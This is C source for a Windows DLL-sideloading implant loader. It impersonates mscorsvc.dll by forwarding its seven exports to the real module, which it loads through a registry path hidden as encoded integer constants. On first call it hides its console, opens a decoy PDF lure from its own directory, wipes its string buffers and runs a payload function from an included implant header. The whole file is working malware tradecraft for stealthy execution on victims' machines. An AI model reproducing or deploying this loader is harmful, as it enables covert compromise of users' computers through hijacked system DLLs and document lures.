/* carrier proxy: each export trampolines here once, then jumps to the real one */
#include <windows.h>
#include <winternl.h>

#include "implant.h"
#include "proxy.h"
#include "resolve.h"
#include "runtime.h"

void *bx_real_cor_create_ngen_process;
void *bx_real_cor_get_ngen_policy;
void *bx_real_cor_get_svc;
void *bx_real_cor_init_svc_logger;
void *bx_real_cor_set_critical_task_state;
void *bx_real_cor_stop_non_critical_task;
void *bx_real_cor_svc_log;

/* UNINIT -> BUSY -> READY|FAILED. A single once flag publishes a half-built set. */
#define BX_INIT_UNINIT 0
#define BX_INIT_BUSY   1
#define BX_INIT_READY  2
#define BX_INIT_FAILED 3

static volatile LONG init_state;

/* Decoy outcome: 1 opened, -1 failed, 0 not attempted. Recorded so a dead lure is visible. */
static volatile LONG decoy_status;

/* Path to the real module: registry root + immediates. A bare LoadLibraryA would resolve back to this DLL. */
static int bind_real(bx_context *ctx)
{
    unsigned int w[6];
    char suffix[24];
    char root[MAX_PATH];
    DWORD n;
    size_t len;
    void *real;
    void *p[7];
    int i;

    /* "v4.0.30319\mscorsvc.dll" as little-endian immediates; w[0] holds "v4.0". */
    w[0] = 0x302E3476;   /* v 4 . 0 */
    w[1] = 0x3330332E;   /* . 3 0 3 */
    w[2] = 0x6D5C3931;   /* 1 9 \ m */
    w[3] = 0x726F6373;   /* s c o r */
    w[4] = 0x2E637673;   /* s v c . */
    w[5] = 0x006C6C64;   /* d l l 0 */
    bx_memcpy(suffix, w, sizeof suffix);

    /* RRF_RT_REG_SZ rejects non-strings and guarantees termination. */
    n = sizeof root;
    if (RegGetValueA(HKEY_LOCAL_MACHINE,
                     "SOFTWARE\\Microsoft\\.NETFramework",
                     "InstallRoot", RRF_RT_REG_SZ, NULL, root, &n)
        != ERROR_SUCCESS)
        goto fail;

    /* Measure the string rather than trusting the byte count. */
    len = lstrlenA(root);
    if (len == 0 || len >= sizeof root || root[len - 1] != '\\')
        goto fail;
    if (len + lstrlenA(suffix) + 1 > sizeof root)
        goto fail;
    lstrcpyA(root + len, suffix);

    /* Resolves the real module's dependencies relative to its own directory. */
    real = (void *)LoadLibraryExA(root, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!real)
        goto fail;

    /* Publish only if every destination is present; a partial set is worse than none. */
    p[0] = ctx->get_proc_address(real, "CorCreateNGenProcess");
    p[1] = ctx->get_proc_address(real, "CorGetNGenPolicy");
    p[2] = ctx->get_proc_address(real, "CorGetSvc");
    p[3] = ctx->get_proc_address(real, "CorInitSvcLogger");
    p[4] = ctx->get_proc_address(real, "CorSetCriticalTaskState");
    p[5] = ctx->get_proc_address(real, "CorStopNonCriticalTask");
    p[6] = ctx->get_proc_address(real, "CorSvcLog");

    for (i = 0; i < 7; i++)
        if (!p[i])
            goto fail;

    bx_real_cor_create_ngen_process     = p[0];
    bx_real_cor_get_ngen_policy         = p[1];
    bx_real_cor_get_svc                 = p[2];
    bx_real_cor_init_svc_logger         = p[3];
    bx_real_cor_set_critical_task_state = p[4];
    bx_real_cor_stop_non_critical_task  = p[5];
    bx_real_cor_svc_log                 = p[6];

    bx_wipe(w, sizeof w);
    bx_wipe(suffix, sizeof suffix);
    bx_wipe(root, sizeof root);
    return 1;

fail:
    bx_wipe(w, sizeof w);
    bx_wipe(suffix, sizeof suffix);
    bx_wipe(root, sizeof root);
    return 0;
}

/* Any address inside this module identifies it; see open_dcy. */
static const char dcy_self = 0;

/* The decoy sits beside this DLL and is searched for there, not in the process CWD. */
static int open_dcy(void)
{
    WIN32_FIND_DATAA fd;
    char dir[MAX_PATH];
    HMODULE self = 0;
    HANDLE h;
    DWORD n;
    size_t dlen;

    /* A data address identifies the module; a function pointer conversion is not defined. */
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCSTR)(const void *)&dcy_self, &self))
        return 0;

    n = GetModuleFileNameA(self, dir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH)
        return 0;

    /* Strip the file name, leaving "dir\" with its trailing backslash. */
    while (n > 0 && dir[n - 1] != '\\')
        n--;
    if (n == 0)
        return 0;
    dlen = (size_t)n;

    if (dlen + 6 >= MAX_PATH)              /* "*.pdf" plus a name */
        return 0;
    lstrcpyA(dir + dlen, "*.pdf");

    h = FindFirstFileA(dir, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return 0;
    FindClose(h);

    if (dlen + lstrlenA(fd.cFileName) + 1 > MAX_PATH)
        return 0;
    lstrcpyA(dir + dlen, fd.cFileName);

    /* Returns <= 32 on failure; there is no better document to fall back to. */
    return (INT_PTR)ShellExecuteA(NULL, "open", dir, NULL, NULL,
                                  SW_SHOWNORMAL) > 32;
}

void bx_proxy_once(void)
{
    bx_context ctx = { 0 };
    LONG s = InterlockedCompareExchange(&init_state, BX_INIT_BUSY,
                                        BX_INIT_UNINIT);

    if (s != BX_INIT_UNINIT) {
        /* Another export owns init: wait until the pointers are live. */
        while (InterlockedCompareExchange(&init_state, BX_INIT_BUSY,
                                          BX_INIT_BUSY) == BX_INIT_BUSY)
            Sleep(0);
        return;
    }

    /* Resolve, publish, then announce READY. */
    FreeConsole();
    decoy_status = open_dcy() ? 1 : -1;

    ctx.peb = (bx_peb *)NtCurrentTeb()->ProcessEnvironmentBlock;

    if (bx_resolve_all(&ctx) == BX_OK && bind_real(&ctx)) {
        InterlockedExchange(&init_state, BX_INIT_READY);
        bx_payload(&ctx);
        return;
    }

    /* Publish the failure once; the trampolines then return 0 for every caller. */
    InterlockedExchange(&init_state, BX_INIT_FAILED);
}
